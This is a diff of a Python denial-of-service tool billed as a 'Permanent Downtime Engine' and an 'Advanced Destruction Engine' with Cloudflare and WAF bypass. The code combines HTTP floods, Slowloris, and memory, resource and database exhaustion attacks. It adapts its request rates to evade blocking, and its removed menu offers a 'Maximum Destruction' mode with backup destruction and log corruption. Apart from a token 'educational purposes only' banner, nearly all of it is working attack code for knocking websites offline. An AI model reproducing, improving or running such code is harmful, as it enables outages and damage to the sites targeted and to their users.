+    async def resource_exhaustion_attack(target: TargetInfo, session: aiohttp.ClientSession):
+        try:
+            resource_paths = [
+                '/large-image.jpg',
+                '/big-file.pdf',
+                '/video.mp4',
+                '/archive.zip',
+                '/database-backup.sql',
+                '/log-file.log'
+            ]
+            
+            path = random.choice(resource_paths)
+            url = f"{target.protocol}://{target.host}:{target.port}{path}"
+            
+            headers = random.choice(BROWSER_SIGNATURES)['headers'].copy()
+            headers['User-Agent'] = random.choice(BROWSER_SIGNATURES)['user_agent']
+            
+            if random.random() > 0.5:
+                headers['Range'] = f'bytes={random.randint(0, 1000000)}-{random.randint(1000000, 5000000)}'
+            
+            async with session.get(url, headers=headers, ssl=ssl_context,
+                                 timeout=aiohttp.ClientTimeout(total=20)) as response:
+                total_read = 0
+                async for chunk in response.content.iter_chunked(8192):
+                    total_read += len(chunk)
+                    if total_read > 1048576:
+                        break
+            
+            with AttackState.lock:
+                AttackState.stats['successful'] += 1
+            
+            return 'success'
+            
+        except Exception as e:
+            with AttackState.lock:
+                AttackState.stats['errors'] += 1
+            return 'error'
 
-# ==================== MAIN ENTRY POINT ====================
-def main_part1():
-    """Part 1: Target Discovery and Permanent Downtime Engine"""
-    try:
-        # Clear screen
-        os.system('cls' if os.name == 'nt' else 'clear')
-        
-        # Show banner
-        banner = """
-██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗
-██╔══██╗██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗
-██████╔╝██████╔╝███████║██║     █████╔╝ ███████║██████╔╝
-██╔══██╗██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗
-██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║
-╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
-                PERMANENT DOWNTIME ENGINE v8.0 - PART 1
-           TARGET DISCOVERY & PERMANENT DOWNTIME SYSTEM
-        """
-        
-        console.print(Panel.fit(
-            Text(banner, style="bold red"),
-            border_style="bold red",
-            padding=(1, 2)
-        ))
-        
-        console.print("[bold cyan]🔥 PART 1: TARGET DISCOVERY & PERMANENT DOWNTIME ENGINE[/]")
-        console.print("[yellow]⚠️  This tool is for EDUCATIONAL PURPOSES ONLY![/]")
-        console.print("[red]🚫 Using against unauthorized targets is ILLEGAL![/]\n")
-        
-        # Get target URL
-        target_url = input("🎯 Enter target URL (e.g., example.com): ").strip()
-        if not target_url:
-            console.print("[red]✗ No target specified![/]")
-            return
-        
-        # Configuration
-        console.print("\n[bold cyan]⚙️  CONFIGURATION[/]")
-        console.print("[yellow]1.[/] Default Settings (Recommended)")
-        console.print("[yellow]2.[/] Maximum Destruction")
-        console.print("[yellow]3.[/] Custom Settings")
-        
-        config_choice = input("\n👉 Select [1-3]: ").strip()
-        
-        if config_choice == '2':
-            # Maximum destruction
-            Config.MAX_THREADS = 5000
-            Config.MAX_RPS = 10000
-            Config.AGGRESSIVE_MODE = True
-            Config.DESTROY_BACKUPS = True
-            Config.CORRUPT_LOGS = True
-            Config.EXHAUST_RESOURCES = True
-            Config.SPOOF_IPS = True
-            
-            console.print("[red]💀 MAXIMUM DESTRUCTION MODE ACTIVATED![/]")
-            
-        elif config_choice == '3':
-            # Custom configuration
-            console.print("\n[bold cyan]⚙️  CUSTOM CONFIGURATION[/]")
-            
-            try:
-                threads = int(input("Max threads (default 1000): ").strip() or "1000")
-                Config.MAX_THREADS = max(100, min(threads, 10000))
-                
-                rps = int(input("Max RPS (default 5000): ").strip() or "5000")
-                Config.MAX_RPS = max(100, min(rps, 20000))
-                
-                duration = input("Attack duration (0 for infinite): ").strip()
-                Config.ATTACK_DURATION = int(duration) if duration else 0
-                
-                destroy_backups = input("Destroy backups? (y/n): ").strip().lower()
-                Config.DESTROY_BACKUPS = (destroy_backups == 'y')
-                
-                corrupt_logs = input("Corrupt logs? (y/n): ").strip().lower()
-                Config.CORRUPT_LOGS = (corrupt_logs == 'y')
-                
-                exhaust_resources = input("Exhaust resources? (y/n): ").strip().lower()
-                Config.EXHAUST_RESOURCES = (exhaust_resources == 'y')
-                
-                console.print(f"[green]✅ Configuration updated![/]")
-                
-            except ValueError:
-                console.print("[yellow]⚠️  Invalid input, using defaults[/]")
-        
-        # Start target discovery
-        console.print("\n[bold green]🚀 STARTING TARGET DISCOVERY...[/]")
-        
-        discovery = AdvancedTargetDiscovery(target_url)
-        
-        if not discovery.parse_target():
-            console.print("[red]✗ Failed to parse target![/]")
-            return
-        
-        # Discover complete infrastructure
-        with console.status("[bold green]🔍 Discovering complete infrastructure...[/]", spinner="dots") as status:
-            discovery.discover_complete_infrastructure()
-        
-        # Show attack plan
-        console.print("\n[bold red]🎯 ATTACK PLAN GENERATED[/]")
-        
-        attack_plan = Panel.fit(
-            f"[cyan]Target:[/] {discovery.protocol}://{discovery.host}:{discovery.port}\n"
-            f"[cyan]IP Addresses:[/] {len(discovery.infrastructure['ips'])}\n"
-            f"[cyan]Subdomains:[/] {len(discovery.infrastructure['subdomains'])}\n"
-            f"[cyan]Attack Points:[/] {sum(len(v) for v in discovery.infrastructure.values())}\n"
-            f"[cyan]Mode:[/] {'PERMANENT DOWNTIME' if Config.ATTACK_DURATION == 0 else f'TEMPORARY ({Config.ATTACK_DURATION}s)'}\n"
-            f"[cyan]Threads:[/] {Config.MAX_THREADS}\n"
-            f"[cyan]RPS:[/] {Config.MAX_RPS}",
-            title="⚔️ ATTACK CONFIGURATION",
-            border_style="bold yellow"
+# ==================== SMART ATTACK MANAGER ====================
+class SmartAttackManager:
+    
+    def __init__(self, target):
+        self.target = target
+        self.session = None
+        self.attack_methods = [
+            AdvancedAttackVectors.http_flood_attack,
+            AdvancedAttackVectors.slowloris_attack,
+            AdvancedAttackVectors.memory_exhaustion_attack,
+            AdvancedAttackVectors.database_flood_attack,
+            AdvancedAttackVectors.resource_exhaustion_attack
+        ]
+        self.method_weights = [0.3, 0.2, 0.2, 0.15, 0.15]
+        self.blocked_counter = {
+            'cloudflare': 0,
+            'captcha': 0,
+            'waf': 0,
+            'rate_limit': 0,
+            'total': 0
+        }
+        self.success_counter = 0
+        self.adaptive_mode = 'normal'
+    
+    async def init_session(self):
+        timeout = aiohttp.ClientTimeout(
+            total=Config.REQUEST_TIMEOUT,
+            connect=8,
+            sock_read=12,
+            sock_connect=8
         )
-        
-        console.print(attack_plan)
-        
-        # Final confirmation
-        console.print(f"\n[bold red]⚠️  READY TO LAUNCH PERMANENT DOWNTIME ATTACK[/]")
-        
-        confirm = input("\n👉 Type 'DESTROY' to activate permanent downtime: ").strip()
-        
-        if confirm.upper() != 'DESTROY':
-            console.print("[yellow]⚠️  Attack cancelled![/]")
+        connector = aiohttp.TCPConnector(
+            limit=0,
+            ssl=ssl_context,
+            force_close=True,
+            enable_cleanup_closed=True,
+            ttl_dns_cache=300,
+            use_dns_cache=True
+        )
+        cookie_jar = aiohttp.CookieJar()
+        self.session = aiohttp.ClientSession(
+            connector=connector,
+            timeout=timeout,
+            cookie_jar=cookie_jar
+        )
+    
+    def _update_adaptive_mode(self):
+        total_attempts = self.blocked_counter['total'] + self.success_counter
+        if total_attempts == 0:
             return
-        
-        # Activate permanent downtime
-        console.print("\n[bold red]💀 ACTIVATING PERMANENT DOWNTIME ENGINE...[/]")
-        
-        AttackState.attacking = True
-        AttackState.start_time = time.time()
-        
-        # Create and run permanent downtime engine
-        downtime_engine = PermanentDowntimeEngine(discovery)
-        
-        # Run the attack
-        asyncio.run(downtime_engine.activate_permanent_downtime())
-        
-        # Generate final report
-        console.print("\n[bold green]📊 GENERATING ATTACK REPORT...[/]")
-        
-        report = downtime_engine.get_attack_report()
-        if report:
-            report_text = f"""
-            ╔══════════════════════════════════════════════════════════════╗
-            ║               PERMANENT DOWNTIME - PART 1 REPORT             ║
-            ╠══════════════════════════════════════════════════════════════╣
-            ║                                                              ║
-            ║  🎯 [bold cyan]TARGET:[/] {report['target']:<40} ║
-            ║  ⏱️  [bold cyan]DOWNTIME:[/] {report['downtime_minutes']} minutes ({report['downtime_duration']}s){'':<15} ║
-            ║  ☠️  [bold cyan]HEALTH CHECKS KILLED:[/] {report['health_checks_killed']:<30} ║
-            ║  💾 [bold cyan]BACKUPS DESTROYED:[/] {report['backups_destroyed']:<32} ║
-            ║  📝 [bold cyan]LOGS CORRUPTED:[/] {report['logs_corrupted']:<35} ║
-            ║  ⚡ [bold cyan]RESOURCES EXHAUSTED:[/] {report['resources_exhausted']:<30} ║
-            ║  📨 [bold cyan]TOTAL REQUESTS:[/] {report['total_requests']:,}{'':<25} ║
-            ║                                                              ║
-            ║  {'[bold green]✅ PERMANENT DOWNTIME ACHIEVED[/]' if report['permanent_downtime'] else '[yellow]⚠️  TEMPORARY DOWNTIME[/]'}{'':<30} ║
-            ║                                                              ║
-            ╚══════════════════════════════════════════════════════════════╝
-            """
-            
-            console.print(Panel.fit(report_text, border_style="bold green"))
-            
-            # Save report
+        success_rate = (self.success_counter / total_attempts) * 100
+        if success_rate < 20:
+            self.adaptive_mode = 'stealth'
+            console.print("[yellow]🔄 Switching to STEALTH mode (low success rate)[/]")
+        elif success_rate > 70:
+            self.adaptive_mode = 'aggressive'
+            console.print("[green]⚡ Switching to AGGRESSIVE mode (high success rate)[/]")
+        else:
+            self.adaptive_mode = 'normal'
+    
+    def _get_attack_delay(self):
+        base_delay = 1.0 / Config.MAX_RPS
+        if self.adaptive_mode == 'stealth':
+            return base_delay * random.uniform(2.0, 5.0)
+        elif self.adaptive_mode == 'aggressive':
+            return base_delay * random.uniform(0.5, 1.5)
+        else:
+            return base_delay * random.uniform(0.8, 2.0)
+    
+    async def smart_worker(self, worker_id):
+        while AttackState.attacking:
             try:
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                filename = f"permanent_downtime_part1_{discovery.host}_{timestamp}.txt"
+                if worker_id == 0 and AttackState.stats['total_requests'] % 100 == 0:
+                    self._update_adaptive_mode()
                 
-                with open(filename, 'w') as f:
-                    f.write("PERMANENT DOWNTIME ENGINE - PART 1 REPORT\n")
-                    f.write("=" * 60 + "\n\n")
-                    f.write(f"Target: {report['target']}\n")
-                    f.write(f"Attack Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write(f"Downtime Duration: {report['downtime_duration']} seconds\n")
-                    f.write(f"Health Checks Killed: {report['health_checks_killed']}\n")
-                    f.write(f"Backups Destroyed: {report['backups_destroyed']}\n")
-                    f.write(f"Logs Corrupted: {report['logs_corrupted']}\n")
-                    f.write(f"Resources Exhausted: {report['resources_exhausted']}\n")
-                    f.write(f"Total Requests: {report['total_requests']:,}\n")
-                    f.write(f"Permanent Downtime: {'YES' if report['permanent_downtime'] else 'NO'}\n")
+                attack_method = random.choices(
+                    self.attack_methods,
+                    weights=self.method_weights,
+                    k=1
+                )[0]
                 
-                console.print(f"[green]📄 Report saved: {filename}[/]")
+                if attack_method == AdvancedAttackVectors.slowloris_attack:
+                    result = await attack_method(self.target, worker_id)
+                else:
+                    result = await attack_method(self.target, self.session)
                 
-            except:
-                console.print("[yellow]⚠️  Could not save report[/]")
+                with AttackState.lock:
+                    AttackState.stats['total_requests'] += 1
+                    if result == 'success':
+                        AttackState.stats['successful'] += 1
+                        self.success_counter += 1
+                        self.blocked_counter['total'] = max(0, self.blocked_counter['total'] - 1)
+                    elif result.startswith('blocked_'):
+                        block_type = result.split('_')[1]
+                        AttackState.stats['blocked'] += 1
+                        self.blocked_counter[block_type] += 1
+                        self.blocked_counter['total'] += 1
+                        if block_type in ['cloudflare', 'captcha']:
+                            self.method_weights[0] = max(0.1, self.method_weights[0] - 0.05)
+                            self.method_weights[1] = min(0.4, self.method_weights[1] + 0.03)
+                            self.method_weights[2] = min(0.4, self.method_weights[2] + 0.02)
+                    else:
+                        AttackState.stats['errors'] += 1
+                
+                delay = self._get_attack_delay()
+                await asyncio.sleep(delay)
+                
+            except Exception as e:
+                with AttackState.lock:
+                    AttackState.stats['errors'] += 1
+    
+    async def start_smart_attack(self, num_workers):
+        await self.init_session()
         
-        console.print("\n[bold cyan]✅ PART 1 COMPLETED![/]")
-        console.print("[yellow]Ready for PART 2: Multi-Target Attack System...[/]")
+        console.print("[yellow]🔍 Performing initial reconnaissance...[/]")
+        await asyncio.sleep(2)
         
+        tasks = []
+        worker_count = min(num_workers, Config.MAX_THREADS)
+        
+        slowloris_workers = min(Config.SLOWLORIS_WORKERS, worker_count // 4)
+        http_workers = worker_count - slowloris_workers
+        
+        console.print(f"[cyan]📊 Worker distribution: {http_workers} HTTP workers, {slowloris_workers} Slowloris workers[/]")
+        
+        for i in range(http_workers):
+            task = asyncio.create_task(self.smart_worker(i))
+            tasks.append(task)
+        
+        for i in range(slowloris_workers):
+            task = asyncio.create_task(AdvancedAttackVectors.slowloris_attack(self.target, i))
+            tasks.append(task)
+        
+        try:
+            start_time = time.time()
+            last_adjustment = start_time
+            last_report = start_time
+            
+            while AttackState.attacking and (time.time() - start_time) < Config.ATTACK_DURATION:
+                await asyncio.sleep(1)
+                current_time = time.time()
+                
+                if current_time - last_adjustment > 30:
+                    self._adjust_attack_strategy()
+                    last_adjustment = current_time
+                
+                if current_time - last_report > 10:
+                    self._print_status_report()
+                    last_report = current_time
+                    
+        finally:
+            for task in tasks:
+                task.cancel()
+            if self.session:
+                await self.session.close()
+    
+    def _adjust_attack_strategy(self):
+        total = AttackState.stats['total_requests']
+        if total == 0:
+            return
+        success_rate = (AttackState.stats['successful'] / total) * 100
+        block_rate = (AttackState.stats['blocked'] / total) * 100
+        console.print(f"[cyan]📊 Adaptive adjustment: Success={success_rate:.1f}%, Blocked={block_rate:.1f}%[/]")
+        if block_rate > 50:
+            Config.MAX_RPS = max(100, int(Config.MAX_RPS * 0.7))
+            console.print(f"[yellow]⚠️  High block rate detected, reducing RPS to {Config.MAX_RPS}[/]")
+        elif success_rate > 80 and block_rate < 10:
+            Config.MAX_RPS = min(5000, int(Config.MAX_RPS * 1.2))
+            console.print(f"[green]✅ Good performance, increasing RPS to {Config.MAX_RPS}[/]")
+    
+    def _print_status_report(self):
+        stats = AttackMonitor.calculate_stats()
+        report = Panel.fit(
+            f"[bold cyan]🔄 ADAPTIVE STATUS REPORT[/]\n\n"
+            f"[yellow]Mode:[/] {self.adaptive_mode.upper()}\n"
+            f"[green]Success Rate:[/] {stats['success_rate']:.1f}%\n"
+            f"[red]Block Rate:[/] {(stats['blocked']/max(stats['total_requests'],1))*100:.1f}%\n"
+            f"[blue]Current RPS:[/] {stats['current_rps']:,}\n"
+            f"[magenta]Threads Active:[/] {Config.MAX_THREADS}\n"
+            f"[cyan]Protection Detected:[/] {self.target.protection_type or 'None'}",
+            border_style="bold cyan",
+            padding=(1, 2)
+        )
+        console.print(report)
+
+# ==================== MONITORING & DISPLAY ====================
+class AttackMonitor:
+    
+    current_target = ""
+    
+    @staticmethod
+    def calculate_stats():
+        with AttackState.lock:
+            total = AttackState.stats['total_requests']
+            elapsed = time.time() - AttackState.start_time
+            current_rps = (total - AttackState.last_count) / 1.0 if elapsed > 0 else 0
+            AttackState.stats['current_rps'] = current_rps
+            AttackState.stats['peak_rps'] = max(AttackState.stats['peak_rps'], current_rps)
+            AttackState.last_count = total
+            
+            mbps_sent = (AttackState.stats['bytes_sent'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
+            mbps_recv = (AttackState.stats['bytes_received'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
+            success_rate = (AttackState.stats['successful'] / max(total, 1)) * 100
+            
+            return {
+                'total_requests': total,
+                'successful': AttackState.stats['successful'],
+                'blocked': AttackState.stats['blocked'],
+                'errors': AttackState.stats['errors'],
+                'current_rps': int(current_rps),
+                'peak_rps': int(AttackState.stats['peak_rps']),
+                'mbps_sent': mbps_sent,
+                'mbps_recv': mbps_recv,
+                'success_rate': success_rate,
+                'elapsed_time': int(elapsed),
+                'unique_ips': len(AttackState.stats['unique_ips']),
+                'bytes_sent_mb': AttackState.stats['bytes_sent'] / 1024 / 1024,
+                'bytes_recv_mb': AttackState.stats['bytes_received'] / 1024 / 1024,
+                'waf_detected': AttackState.stats['waf_detected'],
+                'cloudflare_detected': AttackState.stats['cloudflare_detected'],
+                'persistent_connections': AttackState.stats['persistent_connections'],
+                'slowloris_connections': AttackState.stats['slowloris_connections'],
+                'memory_exhaustion_attempts': AttackState.stats['memory_exhaustion_attempts'],
+                'database_floods': AttackState.stats['database_floods'],
+                'connection_pool_size': AttackState.stats['connection_pool_size']
+            }
+    
+    @staticmethod
+    def display_dashboard():
+        with Live(refresh_per_second=2, screen=True) as live:
+            while AttackState.attacking:
+                stats = AttackMonitor.calculate_stats()
+                
+                layout = Layout()
+                layout.split_column(
+                    Layout(name="header", size=3),
+                    Layout(name="main", ratio=2),
+                    Layout(name="footer", size=7)
+                )
+                
+                protection_status = ""
+                if stats['cloudflare_detected']:
+                    protection_status = "[red]☁️ CLOUDFLARE DETECTED[/]"
+                elif stats['waf_detected']:
+                    protection_status = "[yellow]🛡️ WAF DETECTED[/]"
+                else:
+                    protection_status = "[green]✅ NO PROTECTION[/]"
+                
+                header = Panel(
+                    f"[bold red]⚡ ADVANCED DESTRUCTION ENGINE v7.0[/] | "
+                    f"[bold cyan]Target:[/] {AttackMonitor.current_target} | "
+                    f"{protection_status} | "
+                    f"[bold green]Status:[/] {'[green]ACTIVE[/]' if AttackState.attacking else '[red]STOPPED[/]'}",
+                    border_style="bold red"
+                )
+                layout["header"].update(header)
+                
+                main_table = Table(title="📊 LIVE ATTACK STATISTICS", box=box.ROUNDED, title_style="bold cyan")
+                main_table.add_column("METRIC", style="yellow", width=20)
+                main_table.add_column("VALUE", style="green", width=15)
+                main_table.add_column("STATUS", style="magenta", width=20)
+                
+                main_table.add_row("Total Requests", f"{stats['total_requests']:,}", "")
+                main_table.add_row("Current RPS", f"{stats['current_rps']:,}", f"Peak: {stats['peak_rps']:,}")
+                main_table.add_row("Success Rate", f"{stats['success_rate']:.1f}%",
+                                 f"[green]✓ {stats['successful']:,}[/] | [yellow]🚫 {stats['blocked']:,}[/] | [red]✗ {stats['errors']:,}[/]")
+                main_table.add_row("Bandwidth", f"▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s", "")
+                main_table.add_row("Data Transferred", f"Sent: {stats['bytes_sent_mb']:.1f} MB | Recv: {stats['bytes_recv_mb']:.1f} MB", "")
+                main_table.add_row("Attack Duration", f"{stats['elapsed_time']}s", f"Max: {Config.ATTACK_DURATION}s")
+                main_table.add_row("Unique IPs", f"{stats['unique_ips']}", "")
+                main_table.add_row("Threads Active", f"{Config.MAX_THREADS}", f"RPS Limit: {Config.MAX_RPS:,}")
+                main_table.add_row("Persistent Connections", f"{stats['persistent_connections']}", f"Pool: {stats['connection_pool_size']}")
+                main_table.add_row("Slowloris Connections", f"{stats['slowloris_connections']}", "")
+                main_table.add_row("Memory Attacks", f"{stats['memory_exhaustion_attempts']}", "")
+                main_table.add_row("Database Floods", f"{stats['database_floods']}", "")
+                main_table.add_row("Protection", f"{'☁️ CloudFlare' if stats['cloudflare_detected'] else '🛡️ WAF' if stats['waf_detected'] else '✅ None'}", "")
+                
+                layout["main"].update(Panel(main_table, border_style="bold blue"))
+                
+                progress_text = Text()
+                progress_text.append(f"\n🎯 Target: {AttackMonitor.current_target}\n", style="bold cyan")
+                progress_text.append(f"⏱️  Elapsed: {stats['elapsed_time']}s | ", style="yellow")
+                progress_text.append(f"📨 Requests: {stats['total_requests']:,} | ", style="green")
+                progress_text.append(f"⚡ RPS: {stats['current_rps']:,}\n", style="red")
+                
+                progress_table = Table(show_header=False, box=None)
+                progress_table.add_column(width=50)
+                
+                success_bar_length = int(stats['success_rate'] / 2)
+                success_bar = "█" * success_bar_length + "░" * (50 - success_bar_length)
+                progress_table.add_row(f"Success Rate: [{success_bar}] {stats['success_rate']:.1f}%")
+                
+                rps_percent = min(100, (stats['current_rps'] / max(Config.MAX_RPS, 1)) * 100)
+                rps_bar_length = int(rps_percent / 2)
+                rps_bar = "█" * rps_bar_length + "░" * (50 - rps_bar_length)
+                progress_table.add_row(f"RPS Usage:   [{rps_bar}] {stats['current_rps']:,}/{Config.MAX_RPS:,}")
+                
+                if stats['cloudflare_detected']:
+                    protection_bar = "█" * 25 + "░" * 25
+                    progress_table.add_row(f"Protection:  [{protection_bar}] CLOUDFLARE ACTIVE")
+                elif stats['waf_detected']:
+                    protection_bar = "█" * 15 + "░" * 35
+                    progress_table.add_row(f"Protection:  [{protection_bar}] WAF ACTIVE")
+                
+                layout["footer"].update(Panel(progress_table, title="📈 PROGRESS & PROTECTION", border_style="bold green"))
+                live.update(layout)
+                time.sleep(0.5)
+
+# ==================== MAIN FUNCTIONS ====================
+def show_banner():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    banner = """
+    ╔══════════════════════════════════════════════════════════════╗
+    ║                                                              ║
+    ║    ██╗██████╗ ███████╗ █████╗ ███╗   ██╗                    ║
+    ║    ██║██╔══██╗██╔════╝██╔══██╗████╗  ██║                    ║
+    ║    ██║██████╔╝█████╗  ███████║██╔██╗ ██║                    ║
+    ║    ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╗██║                    ║
+    ║    ██║██║  ██║███████╗██║  ██║██║ ╚████║                    ║
+    ║    ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝                    ║
+    ║                                                              ║
+    ║               ADVANCED DESTRUCTION ENGINE v7.0               ║
+    ║           CLOUDFLARE & WAF BYPASS TECHNOLOGY                 ║
+    ║                    AUTHOR: IRFAN                             ║
+    ║                                                              ║
+    ╚══════════════════════════════════════════════════════════════╝
+    """
+    console.print(Panel.fit(banner, border_style="bold red", padding=(1, 2)))
+    
+    features = Panel.fit(
+        "[bold cyan]✨ ADVANCED FEATURES:[/]\n\n"
+        "[green]✓[/] Hybrid Attack (Slowloris + HTTP Flood)\n"
+        "[green]✓[/] CloudFlare Protection Bypass\n"
+        "[green]✓[/] WAF/IPS Evasion Techniques\n"
+        "[green]✓[/] Memory Exhaustion Attacks\n"
+        "[green]✓[/] Database Flooding\n"
+        "[green]✓[/] Persistent Connection Pool\n"
+        "[green]✓[/] Adaptive Attack Strategies\n"
+        "[green]✓[/] Real-time Protection Detection",
+        border_style="bold blue",
+        padding=(1, 2)
+    )
+    console.print(features)
+
+def get_target():
+    console.print("\n[bold cyan]🎯 TARGET CONFIGURATION[/]")
+    console.print("[yellow]Enter target URL (with http:// or https://)[/]")
+    console.print("[green]Examples:[/]")
+    console.print("  • https://example.com")
+    console.print("  • http://192.168.1.1:8080")
+    console.print("  • http://test.com/admin")
+    console.print("  • https://cloudflare-protected-site.com")
+    
+    while True:
+        target_url = input("\n👉 Target URL: ").strip()
+        if not target_url:
+            console.print("[red]✗ Target URL cannot be empty![/]")
+            continue
+        if not (target_url.startswith('http://') or target_url.startswith('https://')):
+            console.print("[yellow]⚠️  Adding http:// prefix[/]")
+            target_url = 'http://' + target_url
+        return target_url
+
+def configure_attack():
+    console.print("\n[bold cyan]⚙️  ADVANCED CONFIGURATION[/]")
+    
+    while True:
+        threads = input(f"Number of threads [{Config.MAX_THREADS}]: ").strip()
+        if not threads:
+            break
+        if threads.isdigit() and int(threads) > 0:
+            Config.MAX_THREADS = int(threads)
+            break
+        console.print("[red]✗ Please enter a valid number![/]")
+    
+    while True:
+        rps = input(f"Requests per second [{Config.MAX_RPS}]: ").strip()
+        if not rps:
+            break
+        if rps.isdigit() and int(rps) > 0:
+            Config.MAX_RPS = int(rps)
+            break
+        console.print("[red]✗ Please enter a valid number![/]")
+    
+    while True:
+        duration = input(f"Attack duration in seconds [{Config.ATTACK_DURATION}]: ").strip()
+        if not duration:
+            break
+        if duration.isdigit() and int(duration) > 0:
+            Config.ATTACK_DURATION = int(duration)
+            break
+        console.print("[red]✗ Please enter a valid number![/]")
+    
+    intensity = input(f"Attack intensity (low/medium/high/extreme) [{Config.ATTACK_INTENSITY}]: ").strip().lower()
+    if intensity in ['low', 'medium', 'high', 'extreme']:
+        Config.set_intensity(intensity)
+    
+    waf_bypass = input(f"Enable WAF bypass? (y/n) [y]: ").strip().lower()
+    Config.ENABLE_WAF_BYPASS = waf_bypass != 'n'
+    
+    human_delays = input(f"Enable human-like delays? (y/n) [y]: ").strip().lower()
+    Config.HUMAN_LIKE_DELAYS = human_delays != 'n'
+    
+    slowloris = input(f"Enable Slowloris attack? (y/n) [y]: ").strip().lower()
+    Config.ENABLE_SLOWLORIS = slowloris != 'n'
+    
+    memory_exhaustion = input(f"Enable memory exhaustion? (y/n) [y]: ").strip().lower()
+    Config.ENABLE_RESOURCE_EXHAUSTION = memory_exhaustion != 'n'
+    
+    database_flood = input(f"Enable database flooding? (y/n) [y]: ").strip().lower()
+    Config.ENABLE_DATABASE_FLOOD = database_flood != 'n'
+    
+    console.print(f"\n[green]✓ Configuration saved:[/]")
+    console.print(f"  • Threads: {Config.MAX_THREADS}")
+    console.print(f"  • RPS Limit: {Config.MAX_RPS}")
+    console.print(f"  • Duration: {Config.ATTACK_DURATION}s")
+    console.print(f"  • Intensity: {Config.ATTACK_INTENSITY.upper()}")
+    console.print(f"  • WAF Bypass: {'[green]ENABLED[/]' if Config.ENABLE_WAF_BYPASS else '[red]DISABLED[/]'}")
+    console.print(f"  • Human-like: {'[green]ENABLED[/]' if Config.HUMAN_LIKE_DELAYS else '[red]DISABLED[/]'}")
+    console.print(f"  • Slowloris: {'[green]ENABLED[/]' if Config.ENABLE_SLOWLORIS else '[red]DISABLED[/]'}")
+    console.print(f"  • Memory Exhaustion: {'[green]ENABLED[/]' if Config.ENABLE_RESOURCE_EXHAUSTION else '[red]DISABLED[/]'}")
+    console.print(f"  • Database Flood: {'[green]ENABLED[/]' if Config.ENABLE_DATABASE_FLOOD else '[red]DISABLED[/]}")
+
+async def run_smart_attack(target_url):
+    target = TargetInfo(target_url)
+    if not target.parse():
+        console.print("[red]✗ Failed to parse target URL![/]")
+        return
+    
+    AttackMonitor.current_target = f"{target.protocol}://{target.host}:{target.port}"
+    
+    with console.status("[bold green]🔍 Scanning target for protections...[/]") as status:
+        if target.scan_and_detect():
+            console.print("[green]✅ Target scan completed![/]")
+            if target.technologies:
+                tech_text = ", ".join(target.technologies[:5])
+                if len(target.technologies) > 5:
+                    tech_text += f" and {len(target.technologies)-5} more"
+                console.print(f"[cyan]Technologies:[/] {tech_text}")
+            if target.protection_detected:
+                console.print(f"[red]⚠️  PROTECTION DETECTED: {target.protection_type.upper()}[/]")
+                if target.protection_type in ['cloudflare', 'captcha']:
+                    Config.MAX_RPS = min(Config.MAX_RPS, 1000)
+                    Config.REQUEST_TIMEOUT = 25
+                    console.print("[yellow]🔧 Adjusting configuration for protected site...[/]")
+                    console.print(f"[yellow]   • Max RPS reduced to: {Config.MAX_RPS}[/]")
+                    console.print(f"[yellow]   • Timeout increased to: {Config.REQUEST_TIMEOUT}s[/]")
+            if target.vulnerabilities:
+                console.print(f"[yellow]🔓 Potential vulnerabilities:[/] {', '.join(target.vulnerabilities[:3])}")
+        else:
+            console.print("[yellow]⚠️  Target scan failed, proceeding with basic detection[/]")
+    
+    manager = SmartAttackManager(target)
+    
+    if Config.CONNECTION_POOLING and Config.ENABLE_SLOWLORIS:
+        pool = PersistentConnectionPool(target, Config.PERSISTENT_CONNECTIONS)
+        pool.create_connections()
+        pool.start()
+    
+    monitor_thread = threading.Thread(target=AttackMonitor.display_dashboard, daemon=True)
+    monitor_thread.start()
+    
+    AttackState.attacking = True
+    AttackState.start_time = time.time()
+    
+    console.print(f"\n[bold red]🚀 LAUNCHING HYBRID ATTACK ON {target.host}...[/]")
+    if target.protection_detected:
+        console.print(f"[yellow]🛡️  Using advanced {target.protection_type.upper()} bypass techniques[/]")
+    console.print("[yellow]Press Ctrl+C to stop the attack[/]")
+    
+    console.print("[yellow]Starting in:[/]")
+    for i in range(3, 0, -1):
+        console.print(f"[red]{i}...[/]")
+        time.sleep(1)
+    
+    try:
+        await manager.start_smart_attack(Config.MAX_THREADS)
     except KeyboardInterrupt:
-        console.print("\n\n[yellow]⚠️  Attack stopped by user![/]")
+        console.print("\n[yellow]⚠️  Attack interrupted by user[/]")
     except Exception as e:
-        console.print(f"\n[red]✗ Fatal error: {e}[/]")
-        import traceback
-        traceback.print_exc()
+        console.print(f"[red]✗ Attack error: {e}[/]")
     finally:
         AttackState.attacking = False
-        console.print("\n[bold cyan]👋 PART 1 COMPLETED![/]")
+        time.sleep(1)
+        
+        if Config.CONNECTION_POOLING and Config.ENABLE_SLOWLORIS:
+            pool.stop()
+        
+        show_final_report(target)
 
-# ==================== RUN PART 1 ====================
-if __name__ == "__main__":
-    # Check Python version
-    if sys.version_info < (3, 7):
-        console.print("[red]✗ Python 3.7 or higher required![/]")
-        sys.exit(1)
+def show_final_report(target):
+    stats = AttackMonitor.calculate_stats()
     
-    # Check dependencies
+    total_time = stats['elapsed_time']
+    hours = total_time // 3600
+    minutes = (total_time % 3600) // 60
+    seconds = total_time % 60
+    avg_rps = stats['total_requests'] / max(total_time, 1)
+    block_rate = (stats['blocked'] / max(stats['total_requests'], 1)) * 100
+    error_rate = (stats['errors'] / max(stats['total_requests'], 1)) * 100
+    
+    protection_analysis = ""
+    if stats['cloudflare_detected']:
+        protection_analysis = "[red]☁️ CLOUDFLARE PROTECTION ACTIVE[/] - Advanced bypass techniques used"
+    elif stats['waf_detected']:
+        protection_analysis = "[yellow]🛡️ WAF PROTECTION ACTIVE[/] - Evasion techniques applied"
+    else:
